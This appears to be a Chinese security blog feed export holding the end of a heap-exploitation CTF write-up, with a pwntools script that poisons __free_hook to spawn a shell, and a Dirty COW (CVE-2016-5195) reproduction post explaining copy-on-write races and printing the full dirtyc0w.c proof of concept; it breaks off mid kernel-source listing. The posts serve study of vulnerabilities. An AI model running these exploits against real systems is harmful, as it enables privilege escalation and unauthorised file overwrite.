class="built_in">str</span>(s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;\n&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">ind,test</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,test)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">ind</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">3</span>)</span><br><span class="line">send(<span class="number">4</span>)</span><br><span class="line">send(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shid</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">send(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">2</span>)</span><br><span class="line">send(<span class="number">4</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">1</span>)</span><br><span class="line">send(<span class="number">4</span>)</span><br><span class="line">send(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x600</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#large</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x7f865d134050</span>+<span class="number">0x7f865cf47000</span></span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2d0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x28</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(heap+<span class="number">0x2e0</span>)+p64(<span class="number">0xb1</span>+<span class="number">0x50</span>)+p64(heap+<span class="number">0x300</span>))</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(heap+<span class="number">0x2e0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0xb0</span>+<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">############################</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x18</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,p64(base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接</p><p><a href="https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_1">https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_1</a></p><p><a href="https://www.anquanke.com/post/id/208407#h3-5">https://www.anquanke.com/post/id/208407#h3-5</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux高危漏洞Dirtycow复现</title>
      <link href="/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>漏洞编号：CVE-2016-5195</p><p>漏洞详情：Linux内核的内存<strong>子系统</strong>在处理<strong>写时拷贝</strong>（Copy-on-Write) 时存在<strong>条件竞争</strong>漏洞</p><p>产生影响：可以破坏私有只读内存映射，获取低权限的本地用户后，利用此漏洞获取其他只读内存映射的写权限，进一步获取 root 权限。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>Race Condition，是指两个或多个进程或线程同时处理一个资源 (比如：全局变量、文件) 产生了非预期的效果，从而使程序执行流改变，进而达到攻击的目的。</p><p>需要的条件：</p><ol><li>并发，即存在至少两个处于进行状态的执行流。</li><li>共享对象，即多个并发流会访问同一对象。常见的有共享内存，文件系统，信号。</li><li>改变对象，即至少有一个执行流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。</li></ol><p>所以当竞争的共享对象是内存中变量时，条件竞争可以算作内存破坏漏洞。分析条件竞争就是分析两个并发的线程/进程在不断的对共享对象做什么。</p><h3 id="Linux-写时拷贝技术-copy-on-write"><a href="#Linux-写时拷贝技术-copy-on-write" class="headerlink" title="Linux 写时拷贝技术(copy-on-write)"></a>Linux 写时拷贝技术(copy-on-write)</h3><p>传统的 fork 函数会通过系统调用直接把所有的资源复制给新进程， 但这样效率低下。</p><p>所以出于效率，Linux 引用了“写时拷贝”的技术，它可以<strong>推迟甚至免除拷贝数据</strong>。</p><p>推迟：通过让父进程和子进程以<strong>只读</strong>的方式共享同一个拷贝，再在需要写入的时候父进程才给子进程复制数据。</p><p>免除：fork 后立即调用exec()</p><h3 id="页式内存管理"><a href="#页式内存管理" class="headerlink" title="页式内存管理"></a>页式内存管理</h3><p>把虚拟内存和物理内存都划分为长度大小固定的页，虚拟的内存只在逻辑上存在，物理的页（也称之为页框，页帧）真实的存在于内存条上，把虚拟内存页和真实的物理内存页的对应关系存储成一张表，就是页表，可以把页表想象成存放在内存中的一个大数组。当 CPU 进行寻址时，会将逻辑地址经过分段机制，变成线性地址，线性地址再通过分页机制，变成物理地址。</p><h3 id="缺页中断处理"><a href="#缺页中断处理" class="headerlink" title="缺页中断处理"></a>缺页中断处理</h3><p>malloc() 和 mmap() 等内存分配函数，在分配时只是建立了<strong>进程虚拟地址空间</strong>，并没有分配虚拟内存对应的物理内存。当进程访问这些<strong>没有建立映射关系的虚拟内存</strong>时，处理器自动触发一个缺页异常。 </p><p>具体一点说就是，因为物理内存是有限的，当一个程序执行时，会将暂时不需要的页面从物理页框换出到<strong>磁盘上</strong>。但是进程看到的自己的内存空间是完整的。所以当进程访问到一个逻辑页面时，操作系统去查页表，发现这个逻辑页面不在内存中，那么则会去磁盘上找到刚才换出的页面，重新加载到内存，然后修好页表，然后重新去用逻辑地址查找这个物理地址，这个过程就是缺页中断。不过这也只是缺页中断的其中一种情况。</p><h3 id="Page-cache"><a href="#Page-cache" class="headerlink" title="Page cache"></a>Page cache</h3><p>页面缓存，内核会为每个文件单独维护一个 Page cache，是一段真正的物理内存，其中会保存用户进程访问过的该文件的内容，这些内容以页为单位保存在内存中。用户进程对于<strong>文件的大多数读写操作</strong>会直接作用到 Page cache 上，内核会选择在适当的时候将 Page cache 中的内容写到磁盘上（当然我们可以手工fsync控制回写），这样可以大大减少磁盘的访问次数，从而提高性能。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap</span><span class="params">(<span class="keyword">void</span> start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offsize)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数的一个很重要的用处就是<strong>将磁盘上的文件映射到虚拟内存</strong>中，对于这个函数唯一要说的就是当 flags 的 <code>MAP_PRIVATE</code> 被置为 1 时，对 mmap 得到内存映射进行的<strong>写操作</strong>会使内核触发 COW 操作，写的是 COW 后的内存，不会同步到磁盘的文件中。</p><h4 id="madvice"><a href="#madvice" class="headerlink" title="madvice"></a>madvice</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">madvice(<span class="keyword">caddr_t</span> addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> advice)</span><br></pre></td></tr></table></figure><p>这个函数的主要用处是告诉内核内存 <code>addr~(addr+len)</code> 在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当 advice 为 <code>MADV_DONTNEED</code> 时，此系统调用相当于通知内核 <code>addr~(addr+len)</code> 的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</p><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>向打开的文件描述符中，写相应的内容。</p><h4 id="proc-self-mem"><a href="#proc-self-mem" class="headerlink" title="/proc/self/mem"></a>/proc/self/mem</h4><p>这个文件是一个<strong>指向当前进程的虚拟内存文件</strong>的文件，当前进程可以通过对这个文件进行读写以直接读写虚拟内存空间，并无视内存映射时的权限设置。也就是说我们可以利用写 /proc/self/mem 来改写不具有写权限的虚拟内存。可以这么做的原因是 /proc/self/mem 是一个文件，只要进程对该文件具有写权限，那就可以随便写这个文件了，只不过对这个文件进行读写的时候需要一遍访问内存地址所需要寻页的流程。因为这个文件指向的是虚拟内存。</p><h2 id="触发原理"><a href="#触发原理" class="headerlink" title="触发原理"></a>触发原理</h2><p>当调用 write 向 <code>/proc/self/mem</code> 文件写数据时，进入内核态后，内核会调用 <strong>get_user_pages</strong> 函数获取要写入的内存地址。</p><ol><li><p><strong>get_user_pages **会调用 **follow_page_mask</strong> 来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有<strong>可写</strong>的权限。第一次获取内存的页表项会因为缺页而失败。</p></li><li><p>接着 <strong>get_user_page</strong> 调用 <strong>faultin_page</strong> 进行缺页处理后第二次调用 <strong>follow_page_mask</strong> 获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。</p></li><li><p>这时候 <strong>get_user_pages **函数会第三次调用 **follow_page_mask</strong> 来获取该内存的页表项，并且<strong>不再要求页表项所指向的内存映射具有可写的权限</strong>，这时是可以成功获取的，获取成功后内核会对这个<strong>只读的内存进行强制的写入操作</strong>。</p></li></ol><p>整个过程说白了就是，对 **/proc/self/mem **进行写操作时， 在第三次读取页表项时会无视权限强行写入。就算是文件映射到虚拟内存中，也不会出现越权写：</p><ul><li>如果写入的虚拟内存是一个 <code>VM_PRIVATE</code> 的映射，那在<strong>缺页</strong>的时候内核就会执行 COW 操作产生一个副本来进行写入，写入的内容是不会同步到文件中的</li><li>如果写入的虚拟内存是一个 <code>VM_SHARE</code> 的映射，那 mmap 能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。</li></ul><p>到这本身时没什么问题的，但是，如果我们在<strong>第二次获取页表项失败后</strong>，让另一个线程调用 <code>madvice(addr,addrlen, MADV_DONTNEED)</code> ，其中<code>addr~addr+addrlen</code> 是一个只读文件的 <code>VM_PRIVATE</code> 的只读内存映射，那该映射的页表项会被置空。这时如果 <strong>get_user_pages</strong> 函数第三次调用 <strong>follow_page_mask</strong> 来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行 COW 操作产生一个副本以供写入。所以缺页处理完成后第四次调用 <strong>follow_page_mask</strong> 获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。</p><h2 id="POC-代码分析"><a href="#POC-代码分析" class="headerlink" title="POC 代码分析"></a>POC 代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">$ sudo -s</span></span><br><span class="line"><span class="comment"># echo this is not a test &gt; foo</span></span><br><span class="line"><span class="comment"># chmod 0404 foo</span></span><br><span class="line"><span class="comment">$ ls -lah foo</span></span><br><span class="line"><span class="comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">this is not a test</span></span><br><span class="line"><span class="comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span></span><br><span class="line"><span class="comment">$ ./dirtyc0w foo m00000000000000000</span></span><br><span class="line"><span class="comment">mmap 56123000</span></span><br><span class="line"><span class="comment">madvise 0</span></span><br><span class="line"><span class="comment">procselfmem 1800000000</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">m00000000000000000</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line"></span><br><span class="line">    lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">  (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>lseek: 按照偏移更改文件描述符的指针，SEEK_SET 表示将指针指向 map</li><li>fstat: 获得文件描述符指向的文件的更多信息，如文件大小等</li><li>madvise: 将自己的主动控制内存的行为告知操作系统内核</li><li>pthread_join：表示主线程”main”会一直等待直到 ph1、ph2 这个线程执行完毕自己才结束</li></ul><p>main 函数首先以只读的方式打开要修改的文件；以只读和私有方式映射到内存中；再启动两个线程，<code>procselfmemThread</code> 线程不断<strong>写</strong>那段内存，<code>madviseThread</code> 线程不断<strong>释放</strong>那段内存。</p><h2 id="源码及漏洞分析"><a href="#源码及漏洞分析" class="headerlink" title="源码及漏洞分析"></a>源码及漏洞分析</h2><p>这个节选了部分会用到的源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages&#123;<span class="comment">//这是一个Wrap</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> __get_user_pages() <span class="comment">//获取用户内存的核心函数</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">...</span><br><span class="line">retry:</span><br><span class="line">...</span><br><span class="line">        cond_resched();</span><br><span class="line">page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">       <span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(vma,...); <span class="comment">//获取失败时会调用这个函数</span></span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">   <span class="keyword">case</span> <span 